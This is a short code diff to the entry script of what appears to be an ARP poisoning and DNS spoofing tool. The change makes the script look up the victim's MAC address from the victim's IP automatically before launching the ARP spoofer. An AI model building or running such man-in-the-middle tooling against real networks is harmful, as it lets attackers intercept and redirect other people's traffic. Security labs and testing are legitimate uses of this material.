@@ -1,7 +1,7 @@
 
 import argparse
 import sys
-from utils import is_root, list_active_interfaces, get_first_active_interface, get_mac_address_of_interface, get_ip_address_of_interface
+from utils import is_root, list_active_interfaces, get_first_active_interface, get_mac_address_of_interface, get_ip_address_of_interface, get_mac_address_from_ip
 from arpPoisoning import ARPSpoofer
 from dnsSpoofing import DNSSpoofer
 
@@ -47,6 +47,8 @@ def main():
 
     # -- Execute the command --
     if args.command == 'arpPoison':
+        if args.macVictim is None and args.ipVictim is not None:
+            args.macVictim = get_mac_address_from_ip(args.ipVictim)
         if args.ipVictim is None or args.macVictim is None or args.ipToSpoof is None:
             sys.exit("Usage: python main.py arpPoison --ipVictim <ip> --macVictim <mac> --ipToSpoof <ip>")
         arp_spoofer = ARPSpoofer(args.interface, args.macAttacker, args.ipAttacker, args.macVictim, args.ipVictim, args.ipToSpoof)
